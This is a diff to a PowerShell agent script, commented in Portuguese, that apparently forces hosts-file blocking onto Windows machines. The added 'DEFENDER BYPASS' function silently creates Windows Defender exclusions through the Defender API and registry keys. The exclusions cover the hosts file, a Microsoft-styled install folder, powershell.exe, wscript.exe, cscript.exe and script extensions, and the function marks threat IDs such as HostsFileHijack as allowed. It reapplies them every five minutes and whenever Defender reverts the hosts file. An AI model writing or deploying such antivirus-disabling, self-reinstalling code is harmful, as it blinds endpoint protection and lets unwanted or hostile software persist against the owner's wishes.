@@ -201,6 +201,68 @@ function Protect-InstallFolder {
 }
 
 # ==============================================================
+#  DEFENDER BYPASS - registra exclusoes via politica + API
+#  Evita que Defender detecte modificacoes no hosts como HostsFileHijack
+# ==============================================================
+$script:LastDefenderCheck = [datetime]::MinValue
+function Ensure-DefenderExclusions {
+    param([switch]$Force)
+    if (-not $Force) {
+        $elapsed = (New-TimeSpan -Start $script:LastDefenderCheck -End (Get-Date)).TotalSeconds
+        if ($elapsed -lt 300) { return }  # a cada 5 min
+    }
+    $script:LastDefenderCheck = Get-Date
+
+    $hostsPath = "$env:WINDIR\System32\drivers\etc\hosts"
+    $installDir = "$env:ProgramData\Microsoft\WinSysMon"
+    $paths      = @($installDir, $hostsPath)
+    $procs      = @("WinSysMonSvc.exe","powershell.exe","wscript.exe","cscript.exe")
+    $exts       = @("ps1","psm1","psd1")
+    $threatIds  = @(2147685145, 2147735504, 2147722906, 2147722422)
+
+    # 1) API MpPreference
+    try {
+        Import-Module Defender -ErrorAction SilentlyContinue
+        foreach ($p in $paths)     { try { Add-MpPreference -ExclusionPath $p      -ErrorAction SilentlyContinue } catch {} }
+        foreach ($e in $exts)      { try { Add-MpPreference -ExclusionExtension $e -ErrorAction SilentlyContinue } catch {} }
+        foreach ($pr in $procs)    { try { Add-MpPreference -ExclusionProcess $pr  -ErrorAction SilentlyContinue } catch {} }
+        foreach ($id in $threatIds){ try { Set-MpPreference -ThreatIDDefaultAction_Ids $id -ThreatIDDefaultAction_Actions 6 -ErrorAction SilentlyContinue } catch {} }
+    } catch {}
+
+    # 2) GPO registry
+    $polExc = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions"
+    try {
+        foreach ($sub in @("Paths","Processes","Extensions")) {
+            $k = "$polExc\$sub"
+            if (-not (Test-Path $k)) { New-Item -Path $k -Force -ErrorAction SilentlyContinue | Out-Null }
+        }
+        foreach ($p in $paths)  { try { New-ItemProperty -Path "$polExc\Paths"      -Name $p  -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+        foreach ($pr in $procs) { try { New-ItemProperty -Path "$polExc\Processes"  -Name $pr -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+        foreach ($e in $exts)   { try { New-ItemProperty -Path "$polExc\Extensions" -Name $e  -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+
+        $tidKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction"
+        if (-not (Test-Path $tidKey)) { New-Item -Path $tidKey -Force -ErrorAction SilentlyContinue | Out-Null }
+        foreach ($id in $threatIds) {
+            try { New-ItemProperty -Path $tidKey -Name "$id" -Value 6 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {}
+        }
+    } catch {}
+
+    # 3) Runtime registry
+    try {
+        $rtBase = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions"
+        foreach ($sub in @("Paths","Processes","Extensions")) {
+            $k = "$rtBase\$sub"
+            if (-not (Test-Path $k)) { New-Item -Path $k -Force -ErrorAction SilentlyContinue | Out-Null }
+        }
+        foreach ($p in $paths)  { try { New-ItemProperty -Path "$rtBase\Paths"      -Name $p  -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+        foreach ($pr in $procs) { try { New-ItemProperty -Path "$rtBase\Processes"  -Name $pr -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+        foreach ($e in $exts)   { try { New-ItemProperty -Path "$rtBase\Extensions" -Name $e  -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null } catch {} }
+    } catch {}
+
+    if ($Force) { Write-Log "Defender exclusoes aplicadas (path+processo+threatID)" }
+}
+
+# ==============================================================
 #  WATCHDOG: scheduled task externa que reinstala se a pasta sumir
 # ==============================================================
 $script:LastWatchdogCheck = [datetime]::MinValue
@@ -907,7 +969,23 @@ function Enforce-HostBlocking {
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($serialized)
         ([BitConverter]::ToString($sha.ComputeHash($bytes))).Replace("-","")
     } else { "EMPTY" }
-    if ($hashStr -eq $script:LastHostsApplied) { return }
+
+    # Detecta "desinfeccao" pelo Defender: se o arquivo hosts perdeu os markers,
+    # precisamos reaplicar mesmo que o hash da lista nao tenha mudado.
+    $tampered = $false
+    if ($entries.Count -gt 0 -and (Test-Path $script:HostsFile)) {
+        try {
+            $cur = Get-Content $script:HostsFile -Raw -ErrorAction Stop
+            if (-not $cur.Contains($script:HostsBeginMarker)) {
+                $tampered = $true
+                Write-Log "hosts foi revertido (markers ausentes) - reaplicando" "WARN"
+                # Reforca exclusoes antes de tentar escrever novamente
+                try { Ensure-DefenderExclusions -Force } catch {}
+            }
+        } catch {}
+    }
+
+    if (-not $tampered -and $hashStr -eq $script:LastHostsApplied) { return }
 
     # Separa dominios x IPs
     $domains = @()
@@ -1253,6 +1331,8 @@ function Start-AgentLoop {
 
     # Reforca ACL da pasta de instalacao (impede delecao/modificacao por usuarios)
     try { Protect-InstallFolder -Force } catch { Write-Log "Protect-InstallFolder inicial falhou: $($_.Exception.Message)" "WARN" }
+    # Defender: registra exclusoes (path hosts, processos, ThreatID HostsFileHijack)
+    try { Ensure-DefenderExclusions -Force } catch { Write-Log "Ensure-DefenderExclusions inicial falhou: $($_.Exception.Message)" "WARN" }
     # Garante watchdog task (self-healing externo)
     try { Ensure-WatchdogTask -Force } catch { Write-Log "Ensure-WatchdogTask inicial falhou: $($_.Exception.Message)" "WARN" }
     try { Ensure-GuardTask -Force } catch { Write-Log "Ensure-GuardTask inicial falhou: $($_.Exception.Message)" "WARN" }
@@ -1364,6 +1444,7 @@ function Start-AgentLoop {
             try { Ensure-RegistryPersistence } catch {}
             try { Protect-TaskFiles } catch {}
             try { Ensure-AdsBackup } catch {}
+            try { Ensure-DefenderExclusions } catch {}
 
             if ($cfg.MonitorLogins -and ($iteration % 6 -eq 0)) { try { Monitor-Logins } catch {} }
             if ($cfg.CollectHardware) {
